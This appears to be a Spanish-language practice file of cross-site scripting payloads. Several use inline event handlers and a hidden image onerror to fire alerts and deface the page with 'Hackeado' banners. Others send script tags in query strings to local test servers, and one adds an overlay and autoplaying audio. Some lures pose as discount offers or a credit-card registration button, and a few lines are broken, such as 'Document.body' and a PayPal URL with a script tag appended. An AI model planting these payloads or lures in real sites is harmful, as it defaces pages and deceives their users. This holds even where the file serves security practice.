=
 1. OnClick (clásico y visual) 
<span onclick="alert('XSS ONCLICK'); 
  document.body.style.backgroundColor = 'black'; 
  document.body.style.color = 'red'; 
  document.body.innerHTML = '<h1 style=\'font-size:10rem;text-align:center;margin-top:20%;\'>Hackeado por OnClick</h1>';" 
  style="cursor:pointer; user-select:none;">
  <a>Haz click aquí (OnClick)</a>
</span>

<br><br>

 2. OnMouseOver (al pasar el cursor encima) 
<span onmouseover="alert('XSS ONMOUSEOVER');
  document.body.style.background = 'darkblue';
  document.body.innerHTML = '<h1 style=\'color:lime;text-align:center;margin-top:20%;font-size:6rem;\'>Hackeado por MouseOver</h1>';" 
  style="cursor:pointer; user-select:none;">
  <a>Pasa el mouse encima (OnMouseOver)</a>
</span>

<br><br>

 3. OnFocus (cuando haces clic dentro del input) 
<input onfocus="alert('XSS ONFOCUS');
  document.body.style.background = 'orange';
  document.body.innerHTML = '<h1 style=\'text-align:center;margin-top:20%;color:white;font-size:5rem;\'>Hackeado por Focus</h1>';" 
  placeholder="Haz clic aquí (OnFocus)">

<br><br>

 4. OnLoad (en una imagen oculta) 
<img src="x" onerror="alert('XSS ONERROR');
  document.body.style.background = 'maroon';
  document.body.innerHTML = '<h1 style=\'text-align:center;color:white;margin-top:20%;font-size:4rem;\'>Hackeado por Error IMG</h1>';" style="display:none;">

<br><br>

< 5. OnDblClick (doble clic) 
<div ondblclick="alert('XSS ONDBLCLICK');
  document.body.style.background = 'green';
  document.body.innerHTML = '<h1 style=\'color:yellow;text-align:center;margin-top:20%;font-size:7rem;\'>Hackeado por Doble Clic</h1>';" 
  style="cursor:pointer; user-select:none;">
  <a>Doble clic aquí (OnDblClick)</a>
</div>


<a href="#" onclick="window.location.href='http://127.0.0.1:8912/?q='+encodeURIComponent('<script>alert(1)</script>')">
  Haz clic para ver ofertas
</a> 


<Button href="#" style="cursor:pointer; user-select:none; position:absolute; padding-top:10px; padding-bottom:10px; padding-left:20px; padding-right:20px;"  onclick="window.location.href='http://127.0.0.1:8922/?q='+encodeURIComponent('<script>alert(1)</script>')">
  Registrar nueva targeta de credito
</Button> 

<a href="#" onclick="Document.body.style.backgroundColor = 'black'; ">
  Haz clic para ver ofertas
</a> 


<Button href="#" style="cursor:pointer; user-select:none; color:rgb(87, 30, 30); "  onclick="window.location.href='https://www.paypal.com/mx/home'+encodeURIComponent('<script>alert(1)</script>')">
  Paypal
</Button> 


<a href="#" onclick="
document.body.style.backgroundImage='url(https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3OGp2YXlzMG9nZng1MTkwZDNwZXkycnB5bDNkMWhodG9yNTZqenJybiZlcD12MV9naWZzX3JlbGF0ZWQmY3Q9Zw/xThuWuex66yqi0d6Fy/giphy.gif)';
document.body.style.backgroundSize='cover';
let d=document.createElement('div');
d.style=`
position:fixed;
inset:0;
background:rgba(0,0,0,0.8);
color:lime;
font-size:3em;
z-index:9999;
display:flex;
align-items:center;
justify-content:center;
text-align:center`;
d.innerText='💀 Fuiste hackeado 💀';
document.body.appendChild(d);
let a=document.createElement('audio');
a.src='https://www.soundhelix.com/examples/mp3/SoundHelix-Song-7.mp3';
a.autoplay=true;
document.body.appendChild(a);
">¡Haz clic para ver descuentos secretos!</a>



<iframe width="110" height="200" src="https://www.myinstants.com/instant/es-hacker-noooo-47700/embed/" frameborder="0" scrolling="no"></iframe>



